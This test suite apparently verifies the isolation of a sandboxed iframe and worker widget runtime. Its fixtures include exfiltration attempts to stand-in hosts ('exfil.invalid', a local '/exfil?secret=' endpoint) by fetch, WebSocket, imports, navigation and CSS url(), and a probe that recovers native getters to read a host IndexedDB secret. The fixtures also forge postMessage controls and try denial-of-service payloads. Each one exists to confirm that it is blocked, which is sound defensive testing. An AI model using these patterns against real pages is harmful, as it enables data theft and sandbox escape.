import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { validateRender, sanitizeStylesheet } from '../packages/widgets/policy.ts';
import { createServer, type Server } from 'node:http';
import { build } from 'esbuild';
import { chromium, expect as browserExpect, type Browser, type Page } from '@playwright/test';
import { widgetShellDocument, WIDGET_SHELL_CSP } from '../packages/widgets/document.ts';
import { WIDGET_WORKER_CSP } from '../packages/widgets/protocol.ts';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const text = { id: 2, tag: '#text', text: 'Observation', attrs: {}, children: [] };
const safe = () => ({ tree: [{ id: 1, tag: 'article', attrs: { class: 'note' }, children: [text] }], css: '' });

describe('worker DOM receiver policy', () => {
  it('accepts novel layout trees and local form controls', () => {
    expect(validateRender(safe())).toBe(true);
    expect(validateRender({ tree: [{ id: 1, tag: 'textarea', attrs: { 'aria-label': 'Notes' }, value: 'Draft', children: [] }], css: '' })).toBe(true);
  });
  it('rejects executable and navigating markup before constructing real DOM', () => {
    for (const tag of ['script', 'iframe', 'a', 'img', 'meta', 'base', 'object', 'svg', 'math', 'link']) {
      const render = safe(); render.tree[0]!.tag = tag;
      expect(validateRender(render), tag).toBe(false);
    }
    for (const name of ['onclick', 'onerror', 'href', 'src', 'srcdoc', 'action', 'formaction', 'is', 'target', '__proto__']) {
      const render = safe(); render.tree[0]!.attrs = { [name]: 'https://exfil.invalid/?secret=private' } as { class: string };
      expect(validateRender(render), name).toBe(false);
    }
  });
  it('rejects oversized, deep, cyclic and duplicate-identity worker messages', () => {
    expect(validateRender({ tree: Array.from({ length: 1001 }, (_, i) => ({ ...text, id: i + 1 })), css: '' })).toBe(false);
    expect(validateRender({ tree: [{ ...text, text: 'x'.repeat(70_000) }], css: '' })).toBe(false);
    expect(validateRender({ tree: [{ ...text, children: [text] }], css: '' })).toBe(false);
    const root = safe(); (root.tree[0]!.children as unknown[]).push(root.tree[0]);
    expect(validateRender(root)).toBe(false);
  });
  it('rejects huge sparse root and child arrays before traversing their lengths, and rejects small holes', () => {
    for (const tree of [new Array(100_000_000), [{ id: 1, tag: 'div', attrs: {}, children: new Array(100_000_000) }], new Array(1), [{ id: 1, tag: 'div', attrs: {}, children: new Array(1) }]]) {
      const start = performance.now();
      expect(validateRender({ tree, css: '' })).toBe(false);
      expect(performance.now() - start).toBeLessThan(50);
    }
  });
  it('keeps usable layout CSS while removing network, executable and expensive rules', () => {
    expect(sanitizeStylesheet('article{display:grid;gap:12px;color:var(--foreground)}')).toContain('display:grid');
    const css = sanitizeStylesheet('@import "https://exfil.invalid"; .x{background:url(https://exfil.invalid);width:99999999px;position:fixed} .x:has(* *){color:red} p{color:red}');
    expect(css).not.toMatch(/url\(|@import|99999999|:has|position/);
    expect(css).toContain('color:red');
  });
  it('fails closed with an actionable error when the fixed trusted receiver asset is missing', async () => {
    const documentURL = new URL('../packages/widgets/document.ts', import.meta.url).href;
    await expect(promisify(execFile)(process.execPath, ['--import', 'tsx', '--input-type=module', '-e', `process.chdir('packages/widgets');await import(${JSON.stringify(documentURL)})`])).rejects.toMatchObject({ stderr: expect.stringContaining('Run pnpm build:widgets before starting the application or tests.') });
  });
});

describe('real browser worker isolation', () => {
  let server: Server, browser: Browser, origin: string, port: number;
  let productionShell: string, productionCSP: string;
  const attempts: string[] = [];
  beforeAll(async () => {
    const startup = await promisify(execFile)(process.execPath, ['--import', 'tsx', '--input-type=module', '-e', "import {widgetShellDocument,WIDGET_SHELL_CSP} from './packages/widgets/document.ts';process.stdout.write(JSON.stringify({html:widgetShellDocument('a'),csp:WIDGET_SHELL_CSP}))"]);
    ({ html: productionShell, csp: productionCSP } = JSON.parse(startup.stdout));
    const [worker, controller, component] = await Promise.all([
      build({ entryPoints: ['packages/widgets/worker.ts'], bundle: true, format: 'iife', write: false, platform: 'browser' }),
      build({ entryPoints: ['packages/widgets/controller.ts'], bundle: true, format: 'iife', globalName: 'WidgetRuntime', write: false, platform: 'browser' }),
      build({ stdin: { resolveDir: process.cwd(), loader: 'tsx', contents: `
        import {createElement} from 'react';import{createRoot}from'react-dom/client';import{Widget}from'./apps/web/src/Widget.tsx';
        const api=window;api.widgetHandle={current:null};api.escaped=0;api.widgetActions=[];api.widgetDirty=false;
        const artifact={id:'a',threadId:'thread',stateId:'state',revision:1,title:'Lease test app',actions:{continue:{}},widget:{html:api.widgetHtmlOverride??'<label>Draft<textarea aria-label="Draft"></textarea></label><button id="continue">Continue</button><script>const note=document.querySelector("textarea");window.harness.onUpdate(h=>note.value=h.state.note);note.oninput=()=>window.harness.setDirty(true);document.querySelector("#continue").onclick=()=>window.harness.emit("continue",{note:note.value});</script>',inputSchema:{type:'object'},stateSchema:{type:'object',properties:{note:{type:'string'}}},eventSchema:{type:'object'},stateSchemaVersion:1}};
        createRoot(document.getElementById('widget-test')).render(createElement(Widget,{ref:api.widgetHandle,artifact,inputs:{},values:{note:'Saved'},stateRevision:0,theme:'light',onDirty:dirty=>api.widgetDirty=dirty,onAccepted:()=>{},onAction:async(...args)=>{api.widgetActions.push(args)},onEscape:()=>api.escaped++}));
      ` }, bundle: true, format: 'iife', write: false, platform: 'browser', define: { 'process.env.NODE_ENV': '"production"' } }),
    ]);
    server = createServer((request, response) => {
      if (request.url === '/widget-runtime/worker.js') { response.writeHead(200, { 'Content-Type': 'text/javascript', 'Content-Security-Policy': WIDGET_WORKER_CSP }); response.end(worker.outputFiles[0]!.text); }
      else if (request.url === '/controller.js') { response.writeHead(200, { 'Content-Type': 'text/javascript' }); response.end(controller.outputFiles[0]!.text); }
      else if (request.url === '/widget-harness.js') { response.writeHead(200, { 'Content-Type': 'text/javascript' }); response.end(component.outputFiles[0]!.text); }
      else if (request.url === '/widget') { response.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': WIDGET_SHELL_CSP }); response.end(widgetShellDocument('a')); }
      else if (request.url === '/production-widget') { response.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': productionCSP }); response.end(productionShell); }
      else if (request.url === '/') { response.writeHead(200, { 'Content-Type': 'text/html' }); response.end('<!doctype html><button onclick="document.querySelector(\'dialog\').showModal()">Settings</button><dialog>Host controls respond</dialog><script src="/controller.js"></script>'); }
      else { attempts.push(request.url ?? ''); response.writeHead(404); response.end('No network capability'); }
    });
    await new Promise<void>(resolve => server.listen(0, resolve));
    port = (server.address() as { port: number }).port; origin = `http://127.0.0.1:${port}`;
    browser = await chromium.launch({ headless: true });
  });
  it('starts the trusted receiver generated by the production node --import tsx loader', async () => {
    const page = await browser.newPage();
    try {
      await page.goto(origin);
      await page.evaluate(({ port }) => {
        (window as any).productionReady = false;
        const iframe = document.createElement('iframe'); iframe.sandbox.add('allow-scripts');
        addEventListener('message', event => { if (event.source === iframe.contentWindow && event.data?.type === 'ready') (window as any).productionReady = true; });
        iframe.src = `http://localhost:${port}/production-widget#token=t&mountId=m`; document.body.append(iframe);
      }, { port });
      await browserExpect.poll(() => page.evaluate(() => (window as any).productionReady), { timeout: 2000 }).toBe(true);
    } finally { await page.close(); }
  });

  it('denies recovered native storage getters host journal reads and mutations intrinsically by worker origin', async () => {
    const page = await browser.newPage();
    try {
      await page.goto(origin);
      await page.evaluate(async () => {
        await new Promise<void>((resolve, reject) => {
          const request = indexedDB.open('generative-harness-journal', 1);
          request.onupgradeneeded = () => request.result.createObjectStore('drafts');
          request.onerror = () => reject(request.error);
          request.onsuccess = () => { const db = request.result, transaction = db.transaction('drafts', 'readwrite'); transaction.objectStore('drafts').put('host-private-draft', 'secret'); transaction.oncomplete = () => { db.close(); resolve(); }; };
        });
      });
      // mount navigates within this origin; the real host fixture persists.
      await mount(page, `<p>Storage probe</p><script>
      window.harness.onUpdate(async()=>{
        const report={origin:globalThis.origin,idbRead:'unavailable',idbMutation:'unavailable',caches:'unavailable',storage:'unavailable'};
        function nativeGetter(object,key){for(let owner=object;owner;owner=Object.getPrototypeOf(owner)){const descriptor=Object.getOwnPropertyDescriptor(owner,key);if(descriptor&&descriptor.get)return descriptor.get.call(object)}throw new Error('Missing native getter')}
        try{const factory=nativeGetter(globalThis,'indexedDB');await new Promise((resolve,reject)=>{const open=factory.open('generative-harness-journal');open.onerror=()=>reject(open.error);open.onupgradeneeded=()=>{open.transaction.abort();reject(new Error('Host journal not found'))};open.onsuccess=()=>{const db=open.result;const tx=db.transaction('drafts','readwrite'),store=tx.objectStore('drafts');const read=store.get('secret');read.onsuccess=()=>{report.idbRead=read.result;store.put('attacker-mutated','secret')};tx.oncomplete=()=>{report.idbMutation='written';db.close();resolve()};tx.onerror=()=>reject(tx.error)}})}catch(error){report.idbRead=report.idbMutation=error.name}
        try{await nativeGetter(globalThis,'caches').keys();report.caches='accessible'}catch(error){report.caches=error.name}
        try{const nav=nativeGetter(globalThis,'navigator');await nativeGetter(nav,'storage').estimate();report.storage='accessible'}catch(error){report.storage=error.name}
        window.harness.emit('storage-probe',report);
      });</script>`);
      await browserExpect.poll(() => page.evaluate(() => (window as any).bridge.find((entry:any)=>entry.payload?.actionId==='storage-probe')?.payload.payload), { timeout: 5000 }).toEqual({ origin: 'null', idbRead: 'SecurityError', idbMutation: 'SecurityError', caches: 'SecurityError', storage: 'TypeError' });
      expect(await page.evaluate(async () => new Promise((resolve,reject)=>{ const open=indexedDB.open('generative-harness-journal');open.onerror=()=>reject(open.error);open.onsuccess=()=>{const db=open.result,read=db.transaction('drafts').objectStore('drafts').get('secret');read.onsuccess=()=>{db.close();resolve(read.result)};read.onerror=()=>reject(read.error)} }))).toBe('host-private-draft');
    } finally { await page.close(); }
  });
  afterAll(async () => { await browser?.close(); if (server) await new Promise<void>(resolve => server.close(() => resolve())); });
  async function mount(page: Page, html: string, path = '/widget') {
    await page.goto(origin);
    await page.evaluate(({ html, port, path }) => {
      const api = window as unknown as { WidgetRuntime: { createWidgetRuntime: (options: any) => any }; runtime: any; bridge: any[]; failures: string[]; mountedFrame: HTMLIFrameElement };
      const iframe = document.createElement('iframe'); iframe.sandbox.add('allow-scripts'); iframe.title = 'Novel app';
      const identity = { token: 't', mountId: 'm', artifactId: 'a' }; api.bridge = []; api.failures = []; api.mountedFrame = iframe;
      api.runtime = api.WidgetRuntime.createWidgetRuntime({ iframe, identity, html, stateSchemaVersion: 1, onFailure: (message: string) => api.failures.push(message), onBridge: (message: any) => {
        api.bridge.push(message);
        if (message.type === 'checkpoint') api.runtime.post({ channel: 'harness-widget', ...identity, type: 'checkpoint.ack', payload: { requestId: message.payload.requestId, stateRevision: 7 } });
      } });
      addEventListener('message', event => { if (event.source === iframe.contentWindow && event.data?.type === 'ready') api.runtime.post({ channel: 'harness-widget', ...identity, type: 'init', inputs: { secret: 'private-input' }, state: { note: 'Saved draft' }, stateRevision: 3, theme: { colorScheme: 'light', '--foreground': 'rgb(1, 2, 3)', '--card': '#fff' } }); });
      iframe.src = `http://localhost:${port}${path}#token=t&mountId=m`; document.body.append(iframe);
    }, { html, port, path });
    return page.frameLocator('iframe');
  }

  async function mountComponent(page: Page, commands: any[], failEnd: () => boolean = () => false, html?: string) {
    await page.route('**/api/**', async route => {
      const url = new URL(route.request().url());
      if (url.pathname === '/api/bootstrap') return route.fulfill({ json: { csrfToken: 'fixture', widgetOrigin: `http://localhost:${port}` } });
      if (url.pathname.endsWith('/mount')) return route.fulfill({ json: { url: `http://localhost:${port}/widget#token=t&mountId=m`, token: 't', mountId: 'm', revision: 1 } });
      if (url.pathname === '/api/commands') {
        const command = route.request().postDataJSON(); commands.push(command);
        if (command.type === 'edit.end' && failEnd()) return route.fulfill({ status: 409, json: { error: { message: 'Release blocked', code: 'USER_EDIT_CONFLICT' } } });
        return route.fulfill({ json: { result: { released: true } } });
      }
      return route.fulfill({ status: 404, json: {} });
    });
    await page.goto(origin);
    await page.evaluate(html => { const root = document.createElement('div'); root.id = 'widget-test'; document.body.append(root); (window as any).widgetHtmlOverride = html; (window as any).__genWidgetLeaseHeartbeatMs = 60000; }, html);
    await page.addScriptTag({ url: `${origin}/widget-harness.js` });
    return page.frameLocator('iframe');
  }

  it('releases a widget lease only after host acceptance, preserves drafts on failure, and resumes under the same action identity', async () => {
    const page = await browser.newPage(); const commands: any[] = []; let failEnd = true;
    try {
      const frame = await mountComponent(page, commands, () => failEnd);
      const draft = frame.getByRole('textbox', { name: 'Draft' });
      await browserExpect(draft).toHaveValue('Saved');
      await draft.fill('Unsynced retained draft');
      await browserExpect.poll(() => commands.filter(command => command.type === 'edit.begin').length).toBe(1);
      expect(await page.evaluate(async () => { try { await (window as any).widgetHandle.current.releaseLease(); return 'released'; } catch (error) { return (error as Error).message; } })).toBe('Release blocked');
      await browserExpect(draft).toHaveValue('Unsynced retained draft');
      expect(await page.evaluate(() => (window as any).widgetDirty)).toBe(true);
      failEnd = false;
      await page.evaluate(() => (window as any).widgetHandle.current.releaseLease());
      // Cross a real heartbeat tick (the harness reschedules with the injected
      // interval): a failed archive can retry without an automatic edit.begin
      // undoing the successful explicit lease release.
      await page.evaluate(() => { (window as any).__genWidgetLeaseHeartbeatMs = 100; });
      await page.waitForTimeout(500);
      expect(commands.filter(command => command.type === 'edit.begin')).toHaveLength(1);
      await frame.getByRole('button', { name: 'Continue', exact: true }).click();
      await browserExpect.poll(() => page.evaluate(() => (window as any).widgetActions)).toEqual([['continue', { note: 'Unsynced retained draft' }, 'widget:a:m']]);
      await browserExpect.poll(() => commands.filter(command => command.type === 'edit.begin').length).toBe(2);
      expect(commands.filter(command => command.type === 'edit.begin' || command.type === 'edit.end').every(command => command.payload.clientId === 'widget:a:m')).toBe(true);
      await browserExpect(draft).toHaveValue('Unsynced retained draft');
    } finally { await page.close(); }
  }, 30_000);

  it('forwards trusted iframe Escape to Widget while rejecting forged worker and wrong-source shell controls', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mountComponent(page, [], () => false, '<textarea aria-label="Draft">Retained</textarea><script>setTimeout(()=>postMessage({type:"shell.escape",payload:{key:"Escape"}}),150)</script>');
      const draft = frame.getByRole('textbox', { name: 'Draft' });
      await browserExpect(draft).toBeVisible();
      await browserExpect(page.getByRole('alert')).toContainText('invalid DOM');
      expect(await page.evaluate(() => (window as any).escaped)).toBe(0);
      await page.evaluate(() => window.postMessage({ channel: 'harness-widget', artifactId: 'a', token: 't', mountId: 'm', type: 'shell.escape', payload: { key: 'Escape' } }, '*'));
      await draft.evaluate(element => {
        // Browser automation deliberately injects forgeries from the correct
        // WindowProxy to exercise mount/token authentication independently.
        for (const identity of [{ token: 'wrong', mountId: 'm' }, { token: 't', mountId: 'obsolete' }]) parent.postMessage({ channel: 'harness-widget', artifactId: 'a', ...identity, type: 'shell.escape', payload: { key: 'Escape' } }, '*');
        element.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
      });
      await draft.press('Escape');
      await browserExpect.poll(() => page.evaluate(() => (window as any).escaped)).toBe(1);
    } finally { await page.close(); }
  });

  for (const variant of ['native', 'legacy'] as const) it(`trusted composing iframe Escape never forwards shell dismissal (${variant})`, async context => {
    const page = await browser.newPage();
    try {
      const frame = await mountComponent(page, [], () => false, '<textarea aria-label="Draft">Retained draft</textarea>');
      const draft = frame.getByRole('textbox', { name: 'Draft' });
      await draft.fill('Retained draft');
      await browserExpect(draft).toHaveValue('Retained draft');
      await draft.focus();
      await draft.evaluate(element => {
        (window as any).compositionKeys = [];
        (window as any).retainedEditor = element;
        // Observe native fields before the receiver's document capture handler.
        window.addEventListener('keydown', event => (window as any).compositionKeys.push({
          isTrusted: event.isTrusted, key: event.key, keyCode: event.keyCode, isComposing: event.isComposing,
        }), true);
      });
      const session = await page.context().newCDPSession(page);
      try {
        if (variant === 'native') await session.send('Input.imeSetComposition', { text: 'Retained draft', selectionStart: 14, selectionEnd: 14, replacementStart: 0, replacementEnd: 14 });
        const retained = await draft.inputValue();
        const frameURL = await page.locator('iframe').getAttribute('src');
        await session.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: variant === 'legacy' ? 229 : 27, nativeVirtualKeyCode: variant === 'legacy' ? 229 : 27 });
        await session.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 });
        const observed = await draft.evaluate(() => (window as any).compositionKeys[0]);
        console.info('Trusted composing Escape observation', variant, JSON.stringify(observed));
        expect(observed).toMatchObject({ isTrusted: true, key: 'Escape' });
        const supported = variant === 'native' ? observed.isComposing === true : observed.keyCode === 229;
        // Let messages posted by the receiver cross to the host before inspection.
        await page.waitForTimeout(100);
        if (supported) {
          expect(await page.evaluate(() => (window as any).escaped)).toBe(0);
          await browserExpect(draft).toHaveValue(retained);
          await browserExpect(draft).toBeVisible();
          expect(await draft.evaluate(element => element === (window as any).retainedEditor && element === document.activeElement)).toBe(true);
          expect(await page.locator('iframe').getAttribute('src')).toBe(frameURL);
        }
        if (variant === 'native') await session.send('Input.imeSetComposition', { text: '', selectionStart: 0, selectionEnd: 0 });
        // Even an unsupported native-IME probe must retain the ordinary trusted control.
        const before = await page.evaluate(() => (window as any).escaped);
        await draft.press('Escape');
        await browserExpect.poll(() => page.evaluate(() => (window as any).escaped)).toBe(before + 1);
        if (supported) expect(before).toBe(0);
        else context.skip(`Pending supported/native IME run: Chromium CDP emitted ${JSON.stringify(observed)} for ${variant} composition`);
      } finally { await session.detach(); }
    } finally { await page.close(); }
  });

  it('reuses a resumed dirty lease when iframe focus acquisition completes before the generated action', async () => {
    const page = await browser.newPage(); const commands: any[] = [];
    try {
      const frame = await mountComponent(page, commands);
      const draft = frame.getByRole('textbox', { name: 'Draft' });
      await draft.fill('Resumed draft');
      await browserExpect.poll(() => commands.filter(command => command.type === 'edit.begin').length).toBe(1);
      await page.getByRole('button', { name: 'Settings', exact: true }).focus();
      await page.evaluate(() => (window as any).widgetHandle.current.releaseLease());
      const resumed = page.waitForResponse(response => response.url().endsWith('/api/commands') && response.request().postDataJSON().type === 'edit.begin');
      await draft.focus();
      await resumed;
      await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 0)));
      await frame.getByRole('button', { name: 'Continue', exact: true }).click();
      await browserExpect.poll(() => page.evaluate(() => (window as any).widgetActions.length)).toBe(1);
      expect(commands.filter(command => command.type === 'edit.begin')).toHaveLength(2);
      expect(commands.filter(command => command.type === 'edit.begin').every(command => command.payload.clientId === 'widget:a:m')).toBe(true);
    } finally { await page.close(); }
  });

  it('executes novel code using the production tsx-generated shell and the built receiver', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, '<p id="startup">Waiting</p><script>window.harness.onUpdate(()=>document.querySelector("#startup").textContent="Production worker ready")</script>', '/production-widget');
      await browserExpect(frame.locator('#startup')).toHaveText('Production worker ready');
      expect(await page.evaluate(() => (window as any).failures)).toEqual([]);
    } finally { await page.close(); }
  });

  it.each([
    ['sparse root', "{tree:new Array(100000000),css:''}"],
    ['sparse children', "{tree:[{id:900,tag:'div',attrs:{},children:new Array(100000000)}],css:''}"],
  ])('rejects a huge %s in Chromium without blocking host controls', async (_label, payload) => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, `<button id="attack">Send invalid tree</button><p>Draft remains</p><script>document.querySelector('#attack').onclick=()=>postMessage({type:'render',payload:${payload}})</script>`);
      await frame.getByRole('button', { name: 'Send invalid tree' }).click();
      await browserExpect.poll(() => page.evaluate(() => (window as any).failures), { timeout: 1000 }).toEqual([expect.stringContaining('invalid DOM')]);
      await page.getByRole('button', { name: 'Settings', exact: true }).click({ timeout: 500 });
      await browserExpect(page.getByRole('dialog')).toBeVisible({ timeout: 500 });
      await browserExpect(frame.getByRole('alert')).toContainText('Generated app stopped');
      expect(await page.evaluate(() => 6 * 7)).toBe(42);
    } finally { await page.close(); }
  });

  it('rejects huge sparse bridge arrays before host JSON serialization', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, `<button id="attack">Send invalid checkpoint</button><script>document.querySelector('#attack').onclick=()=>postMessage({type:'bridge',event:'checkpoint',payload:{requestId:'sparse',values:{notes:new Array(100000000)}}})</script>`);
      await frame.getByRole('button', { name: 'Send invalid checkpoint' }).click();
      await browserExpect.poll(() => page.evaluate(() => (window as any).failures), { timeout: 1000 }).toEqual([expect.stringContaining('bridge limit')]);
      expect(await page.evaluate(() => (window as any).bridge)).toEqual([]);
      await page.getByRole('button', { name: 'Settings', exact: true }).click({ timeout: 500 });
      await browserExpect(page.getByRole('dialog')).toBeVisible({ timeout: 500 });
    } finally { await page.close(); }
  });

  it('runs novel HTML/CSS/JS forms, dirty/checkpoint/emit and theme updates in the same iframe', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, `<style>article{display:grid;gap:12px}textarea{color:var(--foreground)}</style><article><h1>Evidence sorter</h1><label>Note<textarea aria-label="Note"></textarea></label><button id="save">Checkpoint</button><button id="emit">Continue</button><output id="status">Starting</output></article><script>
      const note=document.querySelector('textarea'),status=document.querySelector('#status');window.harness.onUpdate(h=>{if(document.activeElement!==note)note.value=h.state.note});note.oninput=()=>window.harness.setDirty(true);document.querySelector('#save').onclick=async()=>{const ack=await window.harness.checkpoint({note:note.value});status.textContent='Saved revision '+ack.stateRevision};document.querySelector('#emit').onclick=()=>window.harness.emit('continue',{note:note.value});</script>`);
      await browserExpect(frame.getByRole('textbox', { name: 'Note' })).toHaveValue('Saved draft');
      await frame.getByRole('textbox', { name: 'Note' }).fill('Novel local app draft');
      await frame.getByRole('button', { name: 'Checkpoint', exact: true }).click();
      await browserExpect(frame.locator('#status')).toHaveText('Saved revision 7');
      await frame.getByRole('button', { name: 'Continue' }).click();
      await browserExpect.poll(() => page.evaluate(() => (window as any).bridge.some((message: any) => message.type === 'action'))).toBe(true);
      const bridge = await page.evaluate(() => (window as any).bridge);
      expect(bridge).toContainEqual(expect.objectContaining({ type: 'dirty', payload: { dirty: true } }));
      expect(bridge).toContainEqual(expect.objectContaining({ type: 'checkpoint', payload: expect.objectContaining({ values: { note: 'Novel local app draft' } }) }));
      expect(bridge).toContainEqual(expect.objectContaining({ type: 'action', payload: { actionId: 'continue', payload: { note: 'Novel local app draft' } } }));
      expect(await frame.locator('article').evaluate(element => getComputedStyle(element).display)).toBe('grid');
      await page.evaluate(() => (window as any).runtime.post({ channel: 'harness-widget', token: 't', mountId: 'm', artifactId: 'a', type: 'init', inputs: {}, state: { note: 'Novel local app draft' }, stateRevision: 7, theme: { colorScheme: 'dark', '--foreground': 'rgb(240, 241, 242)', '--card': '#111' } }));
      await browserExpect(frame.getByRole('textbox', { name: 'Note' })).toHaveCSS('color', 'rgb(240, 241, 242)');
      expect(await page.evaluate(() => document.querySelector('iframe') === (window as any).mountedFrame)).toBe(true);
      expect(await page.evaluate(() => (window as any).failures)).toEqual([]);
    } finally { await page.close(); }
  });

  it('blocks worker network/imports/nested workers and never executes markup or navigates the iframe', async () => {
    attempts.length = 0;
    const page = await browser.newPage();
    try {
      const destination = `${origin}/exfil?secret=private-input`;
      const frame = await mount(page, `<meta http-equiv="refresh" content="0;url=${destination}"><img src="${destination}" onerror="location='${destination}'"><a href="${destination}">Leaking link</a><form action="${destination}"><input name="secret" value="private-input"><button>Submit local</button></form><p id="status">Initial</p><script>
      window.harness.onUpdate(async()=>{let blocked=0;for(const attempt of [()=>fetch('${destination}'),()=>new WebSocket('ws://127.0.0.1:${port}/exfil'),()=>importScripts('${destination}'),()=>new Worker('${destination}'),()=>import('${destination}'),()=>WorkerGlobalScope.prototype.importScripts.call(globalThis,'${destination}'),()=>WorkerGlobalScope.prototype.fetch.call(globalThis,'${destination}')]){try{await attempt()}catch{blocked++}}window.harness.emit('native-network-probe',{fetchType:typeof WorkerGlobalScope.prototype.fetch,importScriptsType:typeof WorkerGlobalScope.prototype.importScripts});document.querySelector('#status').textContent='Blocked '+blocked;window.location='${destination}';});</script>`);
      await browserExpect(frame.locator('#status')).toHaveText('Blocked 7');
      await frame.getByRole('button', { name: 'Submit local' }).click();
      await page.waitForTimeout(300);
      expect(attempts.filter(url => url.includes('exfil'))).toEqual([]);
      expect(await page.evaluate(() => (window as any).bridge.find((message:any)=>message.payload?.actionId==='native-network-probe')?.payload.payload)).toEqual({ fetchType: 'function', importScriptsType: 'function' });
      expect(page.frames().find(value => value.url().includes('/widget#'))?.url()).toContain(`http://localhost:${port}/widget#`);
      expect(await frame.locator('#harness-root img,#harness-root a,#harness-root meta,#harness-root script,#harness-root iframe').count()).toBe(0);
      expect(await page.evaluate(() => (window as any).failures)).toEqual([]);
    } finally { await page.close(); }
  });

  it('terminates a scheduled infinite worker loop while host Settings and main-frame evaluation respond', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, '<button id="spin">Start infinite loop</button><p id="status">Ready</p><script>document.querySelector("#spin").onclick=()=>{document.querySelector("#status").textContent="Infinite loop entered";setTimeout(()=>{while(true){}},100)}</script>');
      await frame.getByRole('button', { name: 'Start infinite loop' }).click();
      await browserExpect(frame.locator('#status')).toHaveText('Infinite loop entered');
      await page.waitForTimeout(300);
      expect(await page.evaluate(() => 6 * 7)).toBe(42);
      await page.getByRole('button', { name: 'Settings', exact: true }).click({ timeout: 1000 });
      await browserExpect(page.getByRole('dialog')).toBeVisible({ timeout: 1000 });
      await browserExpect.poll(() => page.evaluate(() => (window as any).failures), { timeout: 5000 }).toEqual([expect.stringContaining('execution limit')]);
      await browserExpect(frame.getByRole('alert')).toContainText('Generated app stopped');
      expect(await page.evaluate(() => 1 + 1)).toBe(2);
    } finally { await page.close(); }
  });

  it('rejects forged remote DOM navigation and executable mutations at the host receiver boundary', async () => {
    const page = await browser.newPage();
    try {
      const frame = await mount(page, `<p>Safe draft remains</p><script>setTimeout(()=>postMessage({type:'render',payload:{tree:[{id:300,tag:'iframe',attrs:{src:'${origin}/exfil'},children:[]}],css:''}}),150)</script>`);
      await browserExpect(frame.getByText('Safe draft remains')).toBeVisible();
      await browserExpect.poll(() => page.evaluate(() => (window as any).failures)).toEqual([expect.stringContaining('invalid DOM')]);
      expect(await frame.locator('#harness-root iframe').count()).toBe(0);
      await page.getByRole('button', { name: 'Settings', exact: true }).click();
      await browserExpect(page.getByRole('dialog')).toBeVisible();
    } finally { await page.close(); }
  });
});
